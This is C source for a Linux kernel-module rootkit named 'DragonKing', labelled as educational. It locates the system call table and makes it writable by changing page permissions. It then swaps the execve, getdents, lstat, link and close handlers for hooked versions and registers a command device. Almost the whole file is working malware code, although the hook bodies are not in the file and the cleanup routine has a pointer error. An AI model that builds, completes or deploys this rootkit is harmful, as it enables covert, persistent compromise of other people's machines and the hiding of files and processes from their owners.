#include "DragonKing.h"

//DragonKing Rootkit. 

MODULE_LICENSE("GPL");
MODULE_AUTHOR("DragonKing");
MODULE_DESCRIPTION("A rootkit for educational purposes");

unsigned long** sys_call_table;

static char command[250];
static short readPos=0;
static int times = 0;


static int dev_open(struct inode *inod, struct file *fil)
{
	times++;
	printk(KERN_ALERT"Device opened %d times\n", times);
	return 0;
}

static ssize_t dev_read(struct file *filp, char *buff, size_t len, loff_t *off)
{
	short count = 0;
	while(len && (command[readPos]!=0))
	{
		put_user(command[readPos], buff++);
		count++;
		len--;
		readPos++;
	}
	return count;
}

static ssize_t dev_write(struct file *filp, const char *buff, size_t len, loff_t *off)
{
	short ind = len-1;
	short count = 0;
	memset(command,0, 250);
	readPos = 0;
	//Should be using kzalloc. Come back to this.
	while(len>0)
	{
		command[count] = buff[count];
		count++;
		len--;
	}

	//TODO: Implement a set of commands here
	if(strstr(command, "test") != 0 && agentpid == task_pid_nr(current)){
		printk("Test detected.\n");
	}
	return count;

}

static int dev_rls(struct inode *inod, struct file *fil)
{
	printk(KERN_ALERT"Device closed\n");
	return 0;
}

//We need this to set access permissions on the address we pass to it
void set_addr_rw(unsigned long addr)
{
	    unsigned int level;
	        pte_t *pte = lookup_address(addr, &level);

		    if (pte->pte &~ _PAGE_RW)
			            pte->pte |= _PAGE_RW;
}

//We need this to set our sys_call_table back to read only as the kernel requires
void set_addr_ro(unsigned long addr)
{
	    unsigned int level;
	        pte_t *pte = lookup_address(addr, &level);

		    pte->pte = pte->pte &~_PAGE_RW;
}


static int __init dragonking_init(void)
{
	int t = register_chrdev(666, "dkCommand", &fops);
	//printk("Device register return: %d\n", t);
	//Search /proc/kallsyms for sys_call_table's address
	sys_call_table = (unsigned long**)kallsyms_lookup_name("sys_call_table");
	//Change object's permission to RW
	set_addr_rw((unsigned long) sys_call_table);
	//Set orig_execve to be the origin execve pointer
	orig_execve = (void *)sys_call_table[__NR_execve];
	//Replace original pointer with ours
	sys_call_table[__NR_execve] = (unsigned long*)&hacked_execve;
	orig_getdents = (void *)sys_call_table[__NR_getdents];
	sys_call_table[__NR_getdents] = (unsigned long *)&hacked_getdents;
	orig_lstat = (void *)sys_call_table[__NR_lstat];
	sys_call_table[__NR_lstat] = (unsigned long *)&hacked_lstat;
	orig_link = (void *)sys_call_table[__NR_link];
	sys_call_table[__NR_link] = (unsigned long *)&hacked_link;
	orig_close = (void *)sys_call_table[__NR_close];
	sys_call_table[__NR_close] = (unsigned long *)&hacked_close;
	//orig_open = (void *)sys_call_table[__NR_open];
	//sys_call_table[__NR_open] = (unsigned long *)&hacked_open;
	//Set back to RO
	set_addr_ro((unsigned long) sys_call_table);
	//printk(KERN_INFO "This is a rootkit.\n");
	return 0;    
}

static void __exit dragonking_cleanup(void)
{
	    unregister_chrdev(666, "dkCommand");
	    set_addr_rw((unsigned long) sys_call_table);
	    sys_call_table[__NR_execve] = (unsigned long*)&orig_execve;
	    //sys_call_table[__NR_open] = (unsigned long*)&orig_open;
	    sys_call_table[__NR_lstat] = (unsigned long*)&orig_lstat;
	    sys_call_table[__NR_getdents] = (unsigned long*)&orig_getdents;
	    sys_call_table[__NR_link] = (unsigned long*)&orig_link;
	    sys_call_table[__NR_close] = (unsigned long*)&orig_close;
	    set_addr_ro((unsigned long) sys_call_table);
	    //printk(KERN_INFO "Rootkit removed.\n");
}

module_init(dragonking_init);
module_exit(dragonking_cleanup);
